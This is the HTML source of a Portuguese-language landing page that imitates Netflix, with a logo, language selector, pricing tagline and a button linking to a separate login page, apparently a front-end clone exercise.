<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="index.css">
    <link rel="icon" href="netflix.jpeg">
</head>
<body>
    <div class="background">
        <div class="overlay"></div>
        <header>
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" alt="Netflix Logo" class="logo">
            <div class="language">
                <select id="language-select">
                    <option value="pt">Português</option>
                    <option value="en">English</option>
                </select>
            </div>
        </header>
        <div class="content">
            <h1 id="title">Filmes, séries e muito mais, sem limites</h1>
            <p id="price">A partir de R$ 20,90. Cancele quando quiser.</p>
            <p id="cta-text">Quer assistir? Clique aqui</p>
            <a href="login.html">  
                <button class="login-btn" id="login-btn">Vamos lá</button>
            </a>
        </div>
    </div>
    <script src="index.js"></script>
</body>
</html>
